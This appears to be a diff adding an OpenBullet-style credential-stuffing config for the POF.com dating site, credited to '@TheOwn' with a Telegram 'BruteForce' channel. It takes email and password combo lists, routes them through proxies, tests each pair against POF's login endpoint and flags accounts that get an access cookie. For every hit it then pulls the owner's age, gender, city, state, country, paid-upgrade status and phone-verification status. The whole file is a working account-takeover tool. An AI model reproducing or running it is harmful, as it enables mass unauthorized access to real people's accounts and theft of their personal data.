@@ -1,0 +1,184 @@
+[SETTINGS]
+{
+  "Name": "POF.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-03T12:41:20.2516894+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | Move Verify Required To Custom | CPM Rate: 200-2000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.pof.com/login.aspx" ReadResponseSource=FALSE 
+  
+  HEADER "Host: www.pof.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+REQUEST POST "https://login.pof.com/" 
+  CONTENT "installId=<COOKIES(installid)>&password=<PASS>&rememberMe=false&useTokenPair=true&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.pof.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 123" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://www.pof.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.pof.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "access" 
+  KEYCHAIN Failure OR 
+    KEY "Bad Request" 
+
+REQUEST POST "https://www.pof.com/apiv1/Account/Me" 
+  CONTENT "{\"FetchHighlight\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.pof.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://www.pof.com" 
+  HEADER "Authorization: access <COOKIES(access)>" 
+  HEADER "Request-Id: |cSBZu.Eg18f" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.pof.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "age\":-1," 
+
+PARSE "<SOURCE>" LR "upgraded\":" "," CreateEmpty=FALSE -> CAP "Is Upgraded" 
+
+PARSE "<SOURCE>" LR "age\":" "," CreateEmpty=FALSE -> CAP "Age" 
+
+PARSE "<SOURCE>" LR "gender\":" "," -> VAR "g" 
+
+IF "<g>" EqualTo "0"
+
+FUNCTION Constant "Male" -> CAP "Gender" 
+
+ENDIF
+IF "<g>" EqualTo "1"
+
+FUNCTION Constant "Female" -> CAP "Gender" 
+
+ENDIF
+
+PARSE "<SOURCE>" LR "city\":\"" "\"" CreateEmpty=FALSE -> CAP "City" 
+
+PARSE "<SOURCE>" LR "state\":\"" "\"" CreateEmpty=FALSE -> CAP "State" 
+
+IF "<SOURCE>" Contains "\"country\":1,"
+
+FUNCTION Constant "USA" -> CAP "Country" 
+
+ENDIF
+IF "<SOURCE>" Contains "\"country\":17,"
+
+FUNCTION Constant "CA" -> CAP "Country" 
+
+ENDIF
+IF "<SOURCE>" Contains "\"country\":5,"
+
+FUNCTION Constant "AU" -> CAP "Country" 
+
+ENDIF
+IF "<SOURCE>" Contains "\"country\":92,"
+
+FUNCTION Constant "UK" -> CAP "Country" 
+
+ENDIF
+
+REQUEST GET "https://www.pof.com/" ReadResponseSource=FALSE 
+  
+  HEADER "Host: www.pof.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<ADDRESS>" EqualTo "https://www.pof.com/"
+
+FUNCTION Constant "False" -> CAP "Verification" 
+
+ENDIF
+IF "<ADDRESS>" Contains "www.pof.com/verify"
+
+FUNCTION CurrentUnixTime -> VAR "unix" 
+
+REQUEST GET "https://www.pof.com/apiv1/Verification/Status" 
+  
+  HEADER "Host: www.pof.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; WebView/2.0; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like Gecko" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.pof.com/verify?ru=%2f" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<SOURCE>" Contains "maskedPhoneNumber\":\"\""
+
+FUNCTION Constant "Required (No Phone)" -> CAP "Verification" 
+
+ENDIF
+IF "<SOURCE>" Contains "maskedPhoneNumber\":\"("
+
+FUNCTION Constant "Required (Phone)" -> CAP "Verification" 
+
+ENDIF
+ENDIF
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Verification>" EqualTo "Required (Phone)" 
+
